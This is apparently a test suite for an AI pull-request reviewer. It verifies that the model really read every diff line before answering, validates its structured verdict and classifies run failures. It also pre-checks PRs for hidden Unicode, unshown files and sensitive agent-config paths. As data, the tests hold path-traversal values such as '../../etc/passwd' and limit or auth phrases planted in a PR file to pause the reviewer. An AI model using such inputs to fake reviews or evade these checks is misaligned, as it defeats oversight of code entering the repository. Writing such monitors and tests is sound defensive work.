import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { DatabaseSync } from 'node:sqlite';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { classifyText, diffRead, judgeRun, localDetail, MAX_OUTPUT_BYTES, parseReset, reviewSummary, schemaErrors, SCHEMA, STATUS_TEXT } from '../reviewer/review-output.js';
import { addedLines, diffText, LIMITS, preCheck } from '../reviewer/precheck.js';
import { nextUtcMidnight, ReviewStore } from '../reviewer/store.js';
import { normalize, renderComment } from '../reviewer/dispatcher.js';

const SHA = 'a'.repeat(40);
const NOW = Date.UTC(2026, 10, 2, 12, 0, 0);
const CTX = { sha: SHA, files: new Set(['diff.patch', 'pr.json', 'src/a.js']), jobDir: '/opt/adabra-review/in/1-x', now: NOW };
const good = (over = {}) => ({ verdict: 'pass', sha: SHA, findings: [], ...over });
const finding = (over = {}) => ({ file: 'src/a.js', line: 3, severity: 'minor', message: 'note', ...over });
const result = (over = {}) => ({ type: 'result', subtype: 'success', is_error: false, result: 'text', permission_denials: [], structured_output: good(), ...over });
const run = (r, over = {}) => ({ code: 0, stdout: typeof r === 'string' ? r : JSON.stringify(r), stderr: '', ...over });
const judge = (r, over) => judgeRun(run(r, over), CTX);

test('a complete, valid result is the only way to a pass, and a fail with a blocker maps to failure', () => {
  const pass = judge(result());
  assert.equal(pass.ok, true);
  assert.equal(pass.state, 'success');
  const failed = judge(result({ structured_output: good({ verdict: 'fail', findings: [finding({ severity: 'blocker' })] }) }));
  assert.equal(failed.ok, true);
  assert.equal(failed.state, 'failure');
  assert.equal(failed.findings[0].severity, 'blocker');
  const minor = judge(result({ structured_output: good({ findings: [finding(), finding({ severity: 'major', file: null, line: null })] }) }));
  assert.equal(minor.state, 'success', 'a pass may carry findings below a blocker');
  assert.equal(reviewSummary(minor), 'No blocking findings (2 other finding(s))');
  assert.equal(reviewSummary(failed), '1 blocking finding(s)');
});

test('usage numbers are kept only when they are the right kind of value', () => {
  const r = judge(result({ total_cost_usd: 0.5, num_turns: 3, duration_ms: 900, modelUsage: { m: { inputTokens: 1 } } }));
  assert.deepEqual(r.usage, { cost: 0.5, turns: 3, durationMs: 900, modelUsage: '{"m":{"inputTokens":1}}' });
  const odd = judge(result({ total_cost_usd: 'lots', num_turns: 1.5, duration_ms: null, modelUsage: 'x' }));
  assert.deepEqual(odd.usage, { cost: null, turns: null, durationMs: null, modelUsage: null });
});

test('the schema check: the shipped schema, and every way out of it, by location and never by value', () => {
  assert.deepEqual(schemaErrors(good()), []);
  assert.deepEqual(schemaErrors(good({ findings: [finding({ file: null, line: null })] })), []);
  const secret = 'SECRET-WORDS';
  const wrong = [
    'a string', 7, null, [], {},
    good({ extra: secret }),
    { verdict: 'pass', sha: SHA },
    { verdict: 'pass', findings: [] },
    { sha: SHA, findings: [] },
    good({ verdict: 'maybe' }),
    good({ verdict: secret }),
    good({ sha: SHA.toUpperCase() }),
    good({ sha: SHA.slice(1) }),
    good({ sha: `${SHA}\n` }),
    good({ sha: 7 }),
    good({ findings: 'none' }),
    good({ findings: Array(51).fill(finding()) }),
    good({ findings: [finding({ severity: 'critical' })] }),
    good({ findings: [finding({ severity: secret })] }),
    good({ findings: [finding({ message: 'x'.repeat(501) })] }),
    good({ findings: [finding({ message: 7 })] }),
    good({ findings: [finding({ file: 'x'.repeat(301) })] }),
    good({ findings: [finding({ file: 7 })] }),
    good({ findings: [finding({ line: 0 })] }),
    good({ findings: [finding({ line: -1 })] }),
    good({ findings: [finding({ line: 1.5 })] }),
    good({ findings: [finding({ line: '3' })] }),
    good({ findings: [{ ...finding(), url: secret }] }),
    good({ findings: [{ file: 'a', severity: 'minor', message: 'm' }] }),
    good({ findings: ['just text'] }),
    JSON.parse(`{"verdict":"pass","sha":"${SHA}","findings":[],"__proto__":{"x":1}}`),
  ];
  for (const v of wrong) {
    const errors = schemaErrors(v);
    assert.ok(errors.length, `should be refused: ${JSON.stringify(v)?.slice(0, 80)}`);
    assert.ok(!errors.join().includes(secret), 'an error never repeats the value');
  }
  assert.deepEqual(schemaErrors(good({ findings: Array(50).fill(finding({ message: '\u00E9'.repeat(500) })) })), [], 'limits count characters');
});

test('the schema check refuses a schema keyword it does not know, instead of ignoring it', () => {
  assert.match(schemaErrors('x', { type: 'string', format: 'email' })[0], /format is not supported/);
  assert.match(schemaErrors({ a: 1 }, { properties: { a: { multipleOf: 2 } } })[0], /multipleOf is not supported/);
  assert.deepEqual(schemaErrors(1, { type: 'number' }), ['$: wrong type'], 'a type it does not know passes nothing');
  assert.deepEqual(Object.keys(SCHEMA).sort(), ['additionalProperties', 'properties', 'required', 'type']);
});

test('a result of any other shape is never a pass', () => {
  const notOk = [
    '', '   ', 'not json', '{}', '[]', 'null', '42', '"text"', `${JSON.stringify(result())}${JSON.stringify(result())}`,
    { type: 'assistant', is_error: false, subtype: 'success', permission_denials: [], structured_output: good() },
    result({ is_error: true }),
    result({ subtype: 'error_during_execution' }),
    result({ is_error: 'false' }),
    result({ is_error: 0 }),
    result({ is_error: undefined }),
    result({ subtype: undefined }),
    result({ type: undefined }),
    result({ structured_output: undefined }),
    result({ structured_output: null }),
    result({ structured_output: 'pass' }),
    result({ structured_output: good({ sha: 'b'.repeat(40) }) }),
    result({ structured_output: good({ findings: [finding({ severity: 'blocker' })] }) }),
    result({ structured_output: good({ verdict: 'fail' }) }),
    result({ structured_output: good({ verdict: 'fail', findings: [finding()] }) }),
    result({ structured_output: good({ findings: [finding({ file: 'src/other.js' })] }) }),
    result({ structured_output: good({ findings: [finding({ file: '../../etc/passwd' })] }) }),
    result({ structured_output: good({ findings: [finding({ file: '/etc/passwd' })] }) }),
    result({ structured_output: good({ findings: [finding({ file: 'tree/../../secret' })] }) }),
    result({ permission_denials: [{ tool_name: 'Read' }] }),
    result({ permission_denials: undefined }),
    result({ permission_denials: 'none' }),
  ];
  for (const r of notOk) assert.equal(judge(r).ok, false, JSON.stringify(r)?.slice(0, 120));
  for (const over of [{ code: 1 }, { code: 124 }, { code: 137 }, { code: null, signal: 'SIGKILL' }, { timedOut: true, code: null }, { overflow: true, code: null }]) {
    assert.equal(judge(result(), over).ok, false, JSON.stringify(over));
  }
  assert.equal(judge(`${JSON.stringify(result())}${' '.repeat(MAX_OUTPUT_BYTES)}`).ok, false, 'over the size limit, however valid');
  assert.equal(judge(`${JSON.stringify(result())}\nand some more words`).ok, false, 'a result with anything else after it is not one');
});

// --- reading the whole diff -----------------------------------------------
const JOB_DIR = '/opt/adabra-review/in/1-x';
const DIFF = ['--- src/a.js', '+++ src/a.js', '@@ -1 +1,3 @@', ' x', '+y', '+z', ''].join('\n'); // 6 lines and the last newline
const WANT = DIFF.split('\n');
// As the real CLI gives one Read: the numbered lines it sent the model, and its record of the file's text beside them.
const numbered = (text, start = 1) => String(text).split('\n').map((l, i) => `${start + i}\t${l}`).join('\n');
const sentAs = (content, extra = {}) => ({ message: { content: [{ type: 'tool_result', content, ...extra }] } });
const readOf = (startLine, count, over = {}, top = {}) => {
  const content = WANT.slice(startLine - 1, startLine - 1 + count).join('\n');
  return {
    type: 'user', parent_tool_use_id: null, ...sentAs(numbered(content, startLine)), ...top,
    tool_use_result: { type: 'text', file: { filePath: `${JOB_DIR}/diff.patch`, content, numLines: count, startLine, totalLines: WANT.length, ...over } },
  };
};
const ANSWER = { type: 'assistant', parent_tool_use_id: null, message: { content: [{ type: 'tool_use', name: 'StructuredOutput', input: {} }] } };
const INIT = { type: 'system', subtype: 'init' };
const asLines = (lines) => lines.map((l) => JSON.stringify(l)).join('\n');
const events = (lines, r = result()) => asLines([INIT, ...lines, ANSWER, r]);
const judgeRead = (lines, r, over) => judgeRun(run(events(lines, r), over), { ...CTX, jobDir: JOB_DIR, diff: DIFF });
const judgeExactly = (lines) => judgeRun(run(asLines([INIT, ...lines, result()])), { ...CTX, jobDir: JOB_DIR, diff: DIFF });
const blocked = () => result({ structured_output: good({ verdict: 'fail', findings: [finding({ severity: 'blocker' })] }) });

test('a pass needs every line of the diff read: at once, in pieces, overlapping or out of order', () => {
  assert.deepEqual(judgeRead([readOf(1, 7)]).read, { read: 6, total: 6 });
  assert.equal(judgeRead([readOf(1, 7)]).state, 'success');
  assert.equal(judgeRead([readOf(1, 6)]).state, 'success', 'the empty end after the last newline need not be reached');
  assert.equal(judgeRead([readOf(4, 3), readOf(1, 3)]).state, 'success');
  assert.equal(judgeRead([readOf(1, 4), readOf(3, 4)]).state, 'success');
});

test('a pass with any line unread is partial-read, final, and says only how many', () => {
  for (const lines of [[], [readOf(1, 5)], [readOf(2, 6)], [readOf(1, 2), readOf(4, 3)]]) {
    const r = judgeRead(lines);
    assert.equal(r.ok, false, JSON.stringify(lines).slice(0, 80));
    assert.equal(r.class, 'partial-read');
    assert.equal(r.paid, true, 'it was paid for');
    assert.match(r.why, /^the review read \d of 6 lines of the diff$/);
    assert.equal(r.raw, '');
  }
  assert.equal(judgeRead([readOf(1, 5)]).usage.cost, null);
});

test('a fail stands without the whole diff, as the PR is blocked and is reviewed again at its next commit, and the count comes with it', () => {
  const r = judgeRead([readOf(1, 2)], blocked());
  assert.equal(r.state, 'failure');
  assert.deepEqual(r.read, { read: 2, total: 6 });
});

test('what does not count as reading the diff', () => {
  const asJson = JSON.stringify(readOf(1, 7));
  const notRead = {
    'a file planted under tree/ with the same name': readOf(1, 7, { filePath: `${JOB_DIR}/tree/diff.patch` }),
    'a file of that name in another job': readOf(1, 7, { filePath: '/opt/adabra-review/in/2-y/diff.patch' }),
    'the right name with other text': readOf(1, 7, { content: 'made up\nlines\n' }),
    'a read by something other than the review': readOf(1, 7, {}, { parent_tool_use_id: 'toolu_1' }),
    'the record from a message of another kind': readOf(1, 7, {}, { type: 'assistant' }),
    'a start that is no line': readOf(1, 7, { startLine: 'one' }),
    'no text': readOf(1, 7, { content: null }),
    'no path': readOf(1, 7, { filePath: null }),
    'the words of a read, as the model\'s text': { type: 'assistant', message: { content: [{ type: 'text', text: asJson }] } },
    'the words of a read, as what a file said': { type: 'user', message: { content: [{ type: 'tool_result', content: asJson }] } },
  };
  for (const [what, line] of Object.entries(notRead)) {
    assert.equal(judgeRead([line]).class, 'partial-read', what);
  }
  assert.equal(judgeRead([readOf(1, 7, { startLine: 2 })]).class, 'partial-read', 'lines that do not sit where the file has them');
  assert.equal(judgeRead([readOf(1, 7, { startLine: '1' })]).class, 'partial-read', 'a start that is only text, however like a number');
});

test('a read that came back after the answer is too late: the verdict was already written', () => {
  const whole = readOf(1, 7);
  assert.equal(judgeExactly([whole, ANSWER]).state, 'success');
  assert.equal(judgeExactly([ANSWER, whole]).class, 'partial-read', 'all of it recorded after the answer');
  assert.equal(judgeExactly([readOf(1, 3), ANSWER, readOf(4, 3)]).class, 'partial-read', 'the rest recorded after it');
  const together = { type: 'assistant', parent_tool_use_id: null, message: { content: [{ type: 'tool_use', name: 'Read', input: {} }, { type: 'tool_use', name: 'StructuredOutput', input: {} }] } };
  assert.equal(judgeExactly([readOf(1, 3), together, readOf(4, 3)]).class, 'partial-read', 'asked for in the same message as the answer');
  const split = { type: 'assistant', parent_tool_use_id: null, message: { content: [{ type: 'tool_use', name: 'Read', input: {} }] } };
  assert.equal(judgeExactly([readOf(1, 3), split, ANSWER, readOf(4, 3)]).class, 'partial-read', 'and when the CLI gives each part of that message its own line');
  assert.equal(judgeExactly([readOf(1, 3), ANSWER, readOf(4, 3), ANSWER]).state, 'success', 'an answer the schema sent back, then more reading, then the answer that counts');
  assert.equal(judgeExactly([whole]).class, 'partial-read', 'with no answer on record, nothing shows the reading came first');
});

test('a read the model was not given in full is not read, whatever the CLI recorded beside it', () => {
  for (const [what, sent] of Object.entries({
    'nothing': sentAs(''),
    'a stub': sentAs('<persisted-output>output too large</persisted-output>'),
    'only its first line': sentAs(numbered(WANT[0])),
    'other lines, numbered': sentAs(numbered('--- other\n+++ other\n@@ -1 +1 @@\n x\n+y\n+z')),
    'the lines without their numbers': sentAs(WANT.join('\n')),
    'text that is not a string': sentAs([{ type: 'text', text: numbered(WANT.join('\n')) }]),
    'an error': sentAs(numbered(WANT.join('\n')), { is_error: true }),
    'no message at all': { message: undefined },
  })) {
    assert.equal(judgeRead([readOf(1, 7, {}, sent)]).class, 'partial-read', what);
  }
});

test('a compaction replaces what came before it with a summary, so those reads no longer count', () => {
  const compaction = { type: 'system', subtype: 'compact_boundary', compact_metadata: { trigger: 'auto' } };
  assert.equal(judgeRead([readOf(1, 7), compaction]).class, 'partial-read');
  assert.equal(judgeRead([readOf(1, 4), compaction, readOf(5, 3)]).class, 'partial-read');
  assert.equal(judgeRead([readOf(1, 4), compaction, readOf(1, 7)]).state, 'success', 'reading it again afterwards does count');
  assert.equal(judgeExactly([readOf(1, 7), ANSWER, compaction]).class, 'partial-read', 'nor is it safe to guess about one after the answer');
});

test('an offset of 0 is the first line, though the CLI reports it as line 0', () => {
  assert.equal(judgeRead([readOf(1, 7, { startLine: 0 })]).state, 'success');
  assert.deepEqual(judgeRead([readOf(1, 7, { startLine: 0 })]).read, { read: 6, total: 6 });
});

test('a line the tool cut short is not read, so text cannot hide past where it stops', () => {
  const long = `+${'x'.repeat(5000)}`;
  const diff = `--- a\n+++ a\n${long}\n+end\n`;
  const cut = `--- a\n+++ a\n${long.slice(0, 2000)}\n+end\n`;
  const record = (content, sent = content) => [{ type: 'user', ...sentAs(numbered(sent)), tool_use_result: { file: { filePath: `${JOB_DIR}/diff.patch`, content, startLine: 1, numLines: 5, totalLines: 5 } } }];
  const ctx = { ...CTX, jobDir: JOB_DIR, diff };
  assert.equal(judgeRun(run(events(record(cut))), ctx).class, 'partial-read');
  assert.equal(judgeRun(run(events(record(diff, cut))), ctx).class, 'partial-read', 'cut only in what the model was sent');
  assert.equal(judgeRun(run(events(record(diff))), ctx).ok, true);
});

test('line endings do not make a line unread, and an empty diff has nothing to read', () => {
  const content = '--- a\n+++ a\n+x\n';
  const line = { type: 'user', ...sentAs(numbered(content)), tool_use_result: { file: { filePath: `${JOB_DIR}/diff.patch`, content, startLine: 1, numLines: 4, totalLines: 4 } } };
  assert.equal(judgeRun(run(events([line])), { ...CTX, jobDir: JOB_DIR, diff: '--- a\r\n+++ a\r\n+x\r\n' }).ok, true, 'CRLF, which the CLI hands back as LF');
  assert.equal(judgeRun(run(events([line])), { ...CTX, jobDir: JOB_DIR, diff: '--- a\r\r\n+++ a\n+x\n' }).ok, true, 'and a line ending in more CRs than that, which hide nothing');
  assert.deepEqual(diffRead([], { diff: '', jobDir: JOB_DIR }), { read: 0, total: 0 });
  assert.equal(judgeRun(run(events([])), { ...CTX, jobDir: JOB_DIR, diff: '' }).ok, true);
});

test('only the one newline at the very end need not be reached: a blank line before it is a line', () => {
  const diff = '--- a\n+++ a\n+x\n\n';
  const part = '--- a\n+++ a\n+x';
  const line = { type: 'user', ...sentAs(numbered(part)), tool_use_result: { file: { filePath: `${JOB_DIR}/diff.patch`, content: part, startLine: 1, numLines: 3, totalLines: 5 } } };
  const r = judgeRun(run(events([line])), { ...CTX, jobDir: JOB_DIR, diff });
  assert.equal(r.class, 'partial-read');
  assert.equal(r.why, 'the review read 3 of 4 lines of the diff');
});

test('line-by-line output may be many times its diff, up to the limit', () => {
  assert.equal(MAX_OUTPUT_BYTES, 16 * 1024 * 1024);
  const padding = { type: 'assistant', message: { content: [{ type: 'text', text: 'x'.repeat(3 * 1024 * 1024) }] } };
  assert.equal(judgeRun(run(events([padding, readOf(1, 7)])), { ...CTX, jobDir: JOB_DIR, diff: DIFF }).state, 'success', 'past the old limit of 2 MB');
});

test('with no diff to compare, as in the live check, nothing is asked about reading', () => {
  assert.equal(judge(result()).read, null);
  assert.equal(judge(result()).ok, true);
});

test('line-by-line output: the last result counts, and the lines around it are no source for what went wrong', () => {
  const words = "You've hit your session limit. Not logged in. Overloaded.";
  const fromAFile = { type: 'user', message: { content: [{ type: 'tool_result', content: words }] }, tool_use_result: { type: 'text', file: { filePath: `${JOB_DIR}/tree/x`, content: words, startLine: 1 } } };
  const noResult = [{ type: 'system', subtype: 'init' }, fromAFile].map((l) => JSON.stringify(l)).join('\n');
  for (const over of [{ code: 1 }, { code: 0 }]) {
    const r = judgeRun(run(noResult, over), { ...CTX, jobDir: JOB_DIR, diff: DIFF });
    assert.equal(r.class, 'unknown', 'a PR holding the words cannot pause the reviewer');
    assert.ok(!r.raw.includes('session limit'), 'and they stay out of the log');
  }
  assert.equal(judgeRun(run(noResult, { code: 1, stderr: words }), CTX).class, 'limit', 'what the CLI says on stderr is still read');
  assert.equal(judgeRun(run('You have hit your session limit', { code: 1 }), CTX).class, 'limit', 'as is plain text with no events at all');
  assert.equal(judgeRun(run(`${noResult}\nYou have hit your session limit`, { code: 1 }), CTX).class, 'limit', 'and plain text after them, which is the CLI speaking and not a file');
  assert.ok(!judgeRun(run(`${noResult}\nYou have hit your session limit`, { code: 1 }), CTX).raw.includes('Overloaded'), 'with the events left out of what is searched and logged');
  const marked = events([fromAFile], result({ is_error: true, subtype: 'error_during_execution', result: 'Overloaded', structured_output: undefined }));
  assert.equal(judgeRun(run(marked), CTX).class, 'transient', 'and the result the CLI marks as an error');
});

test('each failure has its class, and the classes decide what happens next', () => {
  const cls = (r, over) => judge(r, over).class;
  assert.equal(cls(result(), { timedOut: true, code: null }), 'run-limit');
  assert.equal(cls(result(), { code: 124 }), 'run-limit');
  assert.equal(cls(result(), { code: null, signal: 'SIGKILL' }), 'run-limit');
  assert.equal(cls(result({ subtype: 'error_max_turns', is_error: true })), 'run-limit');
  assert.equal(cls(result({ subtype: 'error_max_budget_usd', is_error: true })), 'run-limit');
  assert.equal(cls(result({ subtype: 'error_max_structured_output_retries', is_error: true })), 'invalid');
  assert.equal(cls(result(), { overflow: true, code: null }), 'invalid');
  assert.equal(cls(result({ structured_output: good({ sha: 'b'.repeat(40) }) })), 'invalid');
  assert.equal(cls(result({ is_error: true, result: 'something nobody has seen' })), 'unknown');
  assert.equal(cls('nothing like a result'), 'unknown');
  assert.equal(cls(''), 'unknown');
  assert.equal(cls(result(), { code: 3 }), 'unknown', 'a non-zero exit with a clean-looking result');
});

test('limit, auth and transient, from every place a failure can say so', () => {
  const limitTexts = [
    "You've hit your session limit",
    'You\u2019ve hit your weekly limit \u00B7 resets Monday',
    'weekly limit reached',
    'spend limit reached for this workspace',
    'Credit balance is too low',
    'API Error: rate_limit_error',
  ];
  for (const text of limitTexts) {
    assert.equal(judge(result({ is_error: true, result: text })).class, 'limit', `result: ${text}`);
    assert.equal(judge(result({ subtype: 'error_during_execution', is_error: true, result: undefined, errors: [text] })).class, 'limit', `errors: ${text}`);
    assert.equal(judge(result({ subtype: 'error_during_execution', is_error: true, errors: [{ message: text }] })).class, 'limit', `errors, as objects: ${text}`);
    assert.equal(judge(text, { code: 1 }).class, 'limit', `plain stdout: ${text}`);
    assert.equal(judge('', { code: 1, stderr: text }).class, 'limit', `stderr: ${text}`);
  }
  for (const status of [402, 429]) assert.equal(judge(result({ is_error: true, api_error_status: status, result: 'x' })).class, 'limit', String(status));
  for (const text of ['Not logged in \u00B7 Please run /login', 'Invalid API key', 'OAuth token has expired', 'Failed to authenticate']) {
    assert.equal(judge(result({ is_error: true, result: text })).class, 'auth', text);
    assert.equal(judge(text, { code: 1 }).class, 'auth', `plain: ${text}`);
  }
  for (const status of [401, 403]) assert.equal(judge(result({ is_error: true, api_error_status: status, result: 'x' })).class, 'auth', String(status));
  for (const status of [500, 502, 503, 529]) assert.equal(judge(result({ is_error: true, api_error_status: status, result: 'x' })).class, 'transient', String(status));
  for (const text of ['Overloaded', 'read ECONNRESET', 'fetch failed', 'getaddrinfo ENOTFOUND api.example']) {
    assert.equal(judge(result({ is_error: true, result: text })).class, 'transient', text);
  }
  assert.equal(judge(result({ is_error: true, api_error_status: 400, result: 'Credit balance is too low' })).class, 'limit', 'text wins over a status that says nothing');
});

test('the model cannot pause the reviewer by saying the words: text is only read from a failure the CLI itself marks', () => {
  const words = "You've hit your session limit. Not logged in. Overloaded.";
  const r = judge(result({ result: words, structured_output: undefined }));
  assert.equal(r.class, 'invalid');
  const clean = judge(result({ result: words }));
  assert.equal(clean.ok, true, 'and a valid result is judged on its fields, whatever its free text says');
  assert.equal(judge({ type: 'assistant', result: words }).class, 'invalid');
  assert.equal(judge(result({ result: words }), { code: 2 }).class, 'unknown', 'a bad exit does not make the free text trustworthy');
});

test('what the wrapper says about the model not starting', () => {
  for (const code of [78, 77]) {
    const r = judge('', { code, stderr: 'run-review: nope' });
    assert.equal(r.class, 'auth', String(code));
    assert.equal(r.paid, false);
  }
  for (const code of [64, 79, 126, 127]) {
    const r = judge('', { code, stderr: 'run-review: nope' });
    assert.equal(r.class, 'unknown', String(code));
    assert.equal(r.paid, false);
  }
  const sudo = judge('', { code: 1, stderr: 'sudo: a password is required\n' });
  assert.equal(sudo.class, 'auth');
  assert.equal(sudo.paid, false);
  assert.equal(judge('', { code: 1 }).paid, true, 'unless it is sure, a run counts as paid');
});

test('a stated reset is used only when it cannot be misread', () => {
  const after = (ms) => NOW + ms + 60_000;
  assert.equal(parseReset('limit reached|1793700000', NOW), 1793700000 * 1000 + 60_000);
  assert.equal(parseReset('resets at 2026-11-02T15:00:00Z', NOW), Date.UTC(2026, 10, 2, 15) + 60_000);
  assert.equal(parseReset('resets 2026-11-02T15:30:00+02:00', NOW), Date.UTC(2026, 10, 2, 13, 30) + 60_000);
  assert.equal(parseReset('resets in 2 hours', NOW), after(2 * 3_600_000));
  assert.equal(parseReset('resets in 45 minutes', NOW), after(45 * 60_000));
  assert.equal(parseReset('resets in 1h 30m', NOW), after(90 * 60_000));
  assert.equal(parseReset('resets 3pm (UTC)', NOW), Date.UTC(2026, 10, 2, 15) + 60_000);
  assert.equal(parseReset('resets at 9:30 UTC', NOW), Date.UTC(2026, 10, 3, 9, 30) + 60_000, 'already past today, so tomorrow');
  assert.equal(parseReset('resets 12am UTC', NOW), Date.UTC(2026, 10, 3, 0) + 60_000);
  for (const text of ['resets 3pm', 'resets 3pm (America/New_York)', 'resets Monday', 'no time at all', 'resets at 2020-01-01T00:00:00Z', 'resets at 2099-01-01T00:00:00Z', 'resets in 900 hours', 'resets 25 UTC', 'resets 13pm UTC', 'x|1000000000']) {
    assert.equal(parseReset(text, NOW), null, text);
  }
});

test('classifyText reports the stated reset along with the class', () => {
  assert.equal(classifyText('session limit, resets in 2 hours', null, NOW).resetAt, NOW + 2 * 3_600_000 + 60_000);
  assert.equal(classifyText('session limit', null, NOW).resetAt, null);
  assert.equal(classifyText('anything', null, NOW), null);
});

test('the local log gets one bounded line, without a credential', () => {
  const text = localDetail(`line one\nline two sk-ant-abc_DEF-123 ${'x'.repeat(5000)}`);
  assert.ok(!text.includes('\n'));
  assert.ok(!text.includes('abc_DEF'));
  assert.match(text, /\[redacted\]/);
  assert.ok(text.length <= 2000);
});

test('fixed status text only: short enough for GitHub, and it names no account detail', () => {
  for (const [k, text] of Object.entries(STATUS_TEXT)) {
    assert.ok(text.length <= 140, k);
    assert.doesNotMatch(text, /plan|credit|\$/i, k);
  }
});

test('a finding may name the path as the job shows it, and it comes back as the manifest path', () => {
  const named = (file) => judge(result({ structured_output: good({ findings: [finding({ file })] }) }));
  for (const file of ['src/a.js', './src/a.js', 'tree/src/a.js', './tree/src/a.js', `${CTX.jobDir}/tree/src/a.js`]) {
    assert.equal(named(file).findings?.[0].file, 'src/a.js', file);
  }
  assert.equal(named('pr.json').findings[0].file, 'pr.json', 'an injection in the description is reported against this');
  assert.equal(named('diff.patch').findings[0].file, 'diff.patch');
});

// --- pre-checks -------------------------------------------------------------

const DEBUG_STATEMENT = ['debug', 'ger;'].join(''); // in two parts: this repository is reviewed by the rule it tests
const changed = (filename, added = 'const y = 1;', over = {}) => ({ filename, status: 'modified', patch: `@@ -1 +1,2 @@\n x\n+${added}`, ...over });
const unshown = (filename, over = {}) => ({ filename, status: 'modified', changes: 0, sha: 'c'.repeat(40), ...over });
const pre = (files, over) => preCheck({ files, ...over });
const blockerAt = (r) => r.blockers.map((b) => `${b.file}:${b.line}`);

test('pre-checks: a clean PR has no blockers and nothing to read', () => {
  assert.deepEqual(pre([changed('src/a.js')]), { tooLarge: false, blockers: [], attention: [] });
});

test('pre-checks: an added debugger statement blocks, at its line, and one that was already there or removed does not', () => {
  assert.deepEqual(blockerAt(pre([changed('src/a.js', DEBUG_STATEMENT)])), ['src/a.js:2']);
  assert.deepEqual(pre([{ filename: 'a.js', patch: `@@ -1,2 +1 @@\n x\n-${DEBUG_STATEMENT}` }]).blockers, []);
  assert.deepEqual(pre([{ filename: 'a.js', patch: `@@ -1,2 +1,2 @@\n ${DEBUG_STATEMENT}\n x` }]).blockers, []);
});

test('pre-checks: hidden Unicode in an added line blocks, whatever a model might say', () => {
  for (const c of ['\u202A', '\u202E', '\u2066', '\u2069', '\u{E0041}', '\u{E007F}']) {
    assert.deepEqual(blockerAt(pre([changed('src/a.js', `let a = 1; ${c}`)])), ['src/a.js:2'], `U+${c.codePointAt(0).toString(16)}`);
  }
  assert.deepEqual(pre([{ filename: 'a.js', patch: '@@ -1,2 +1 @@\n x\n-old\u202E' }]).blockers, [], 'removing one is good');
});

test('pre-checks: hidden Unicode in a changed name, the title or the description blocks, and the blocker does not repeat it', () => {
  const inName = pre([changed('a\u202Eb.js')]);
  assert.equal(inName.blockers.length, 1);
  assert.equal(inName.blockers[0].file, null);
  assert.equal(pre([changed('a.js')], { title: 'Fix\u{E0041}' }).blockers.length, 1);
  assert.equal(pre([changed('a.js')], { body: 'please \u202E merge' }).blockers.length, 1);
  assert.equal(pre([changed('a.js')], { body: 'plain caf\u00E9 \u{1F600}' }).blockers.length, 0);
});

test('pre-checks: a line break git does not count blocks, and a CRLF line or a control character does not', () => {
  const lineOf = (text) => pre([changed('src/a.js', text)]);
  for (const text of ['// later\rrun();', '// later\u2028run();', '// later\u2029run();']) {
    const r = lineOf(text);
    assert.equal(r.blockers.length, 1, JSON.stringify(text));
    assert.match(r.blockers[0].message, /line break that git does not count/);
    assert.doesNotMatch(r.blockers[0].message, /run\(\)/);
  }
  assert.deepEqual(lineOf('a line from a CRLF file\r').blockers, []);
  const esc = lineOf('fine\u001b[2K');
  assert.deepEqual(esc.blockers, []);
  assert.deepEqual(esc.attention, ['src/a.js:2 (control character)']);
  assert.deepEqual(lineOf('\tindented').attention, []);
});

test('pre-checks: a zero-width character goes on the list to read, and does not block', () => {
  for (const c of ['\u200B', '\u200D', '\u2060', '\uFEFF']) {
    const r = pre([changed('src/a.js', `q${c}`)]);
    assert.deepEqual(r.blockers, []);
    assert.deepEqual(r.attention, ['src/a.js:2 (zero-width character)']);
  }
});

test('pre-checks: a changed file GitHub will not show blocks, unless there is nothing it could hide', () => {
  assert.deepEqual(blockerAt(pre([unshown('tool.bin')])), ['tool.bin:null']);
  assert.deepEqual(blockerAt(pre([unshown('huge.js', { changes: 90_000 })])), ['huge.js:null']);
  assert.deepEqual(blockerAt(pre([unshown('moved.js', { status: 'renamed', changes: 7 })])), ['moved.js:null'], 'a rename with changes GitHub will not show');
  assert.deepEqual(blockerAt(pre([{ filename: 'src/evil.js', status: 'modified', patch: null }])), ['src/evil.js:null'], 'a patch of null is not a patch');
  for (const fine of [unshown('gone.bin', { status: 'removed' }), unshown('moved.js', { status: 'renamed', previous_filename: 'old.js' }), unshown('__init__.py', { status: 'added', sha: 'e69de29bb2d1d6434b8b29ae775ad8c2e48c5391' })]) {
    const r = pre([fine]);
    assert.deepEqual(r.blockers, [], fine.filename);
    assert.ok(r.attention.some((a) => a.includes('not shown by GitHub')), `${fine.filename} is still listed`);
  }
});

test('pre-checks: an image or font extension says nothing about what a file holds, so it blocks unless the operator says otherwise', () => {
  for (const name of ['logo.png', 'logo.PNG', 'font.woff2', 'photo.jpg', 'anim.gif']) {
    assert.deepEqual(blockerAt(pre([unshown(name)])), [`${name}:null`], name);
  }
  assert.deepEqual(blockerAt(pre([unshown('logo.png')], { unshownOk: ['woff'] })), ['logo.png:null'], 'the operator\'s list says which');
  assert.deepEqual(pre([unshown('logo.PNG')], { unshownOk: ['png'] }).blockers, []);
  assert.deepEqual(pre([unshown('tool.bin')], { unshownOk: ['bin'] }).blockers, []);
  const listed = pre([unshown('logo.png')], { unshownOk: ['png'] });
  assert.ok(listed.attention.some((a) => a.includes('not shown by GitHub')), 'and it stays on the list for a person to look at');
});

test('pre-checks: the sensitive paths go on the list to read', () => {
  const sensitive = ['reviewer/main.js', 'service/x.sh', 'coordinator/a.js', 'night/runner.js', 'ops/main.js', 'shared/stop.js', 'helper/claims.js', 'backup/main.js', 'onboarding/a.js', 'node_modules/.bin/node', 'src/node_modules/x.js', '.npmrc', 'sub/.npmrc', '.yarnrc.yml', '.pnpmfile.cjs', '.envrc', '.husky/pre-commit', '.vscode/tasks.json', '.devcontainer/x.json', 'Service/x.sh', 'NIGHT/runner.js', 'Package.json', 'Test/a.js', '.github/workflows/ci.yml', '.claude/settings.json', 'sub/.claude/x', 'CLAUDE.md', 'sub/claude.local.md', 'AGENTS.md', '.mcp.json', 'package.json', 'web/package.json', 'package-lock.json', 'yarn.lock', 'pnpm-lock.yaml', 'test/a.js', 'src/tests/a.js', 'src/__tests__/a.js', 'src/a.test.js', 'src/a.spec.ts'];
  for (const name of sensitive) assert.deepEqual(pre([changed(name)]).attention, [name], name);
  for (const name of ['src/a.js', 'docs/reviewer/notes.md', 'docs/night/notes.md', 'contest/a.js', 'README.md']) assert.deepEqual(pre([changed(name)]).attention, [], name);
  assert.deepEqual(pre([changed('src/moved.js', 'x', { status: 'renamed', previous_filename: 'reviewer/moved.js' })]).attention, ['src/moved.js'], 'moving a file out still counts');
